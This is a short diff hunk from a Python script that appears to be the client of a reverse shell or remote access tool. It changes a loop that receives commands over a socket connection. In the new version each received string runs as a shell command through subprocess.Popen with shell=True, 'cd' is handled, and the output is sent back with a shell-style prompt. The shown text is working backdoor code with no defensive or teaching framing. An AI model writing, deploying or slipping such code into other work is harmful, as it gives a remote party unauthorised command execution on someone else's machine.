@@ -33,12 +33,15 @@ def sys_info():
 sys_info()
 
 while True:
-    command = client.recv(20480).decode()
-    if command.lower() == 'exit':
-        break
-    
-    output = subprocess.getoutput(command)
-    client.send(output.encode())
+    data = client.recv(1024)
+    if data[:2].decode(FORMAT) == "cd":
+        os.chdir(data[3:].decode(FORMAT))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode(FORMAT), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output = cmd.stdout.read() + cmd.stderr.read()
+        output = str(output, FORMAT)
+        client.send(str.encode(output + str(os.getcwd()) + "$ "))
+        print(output)
 
 
 client.close()
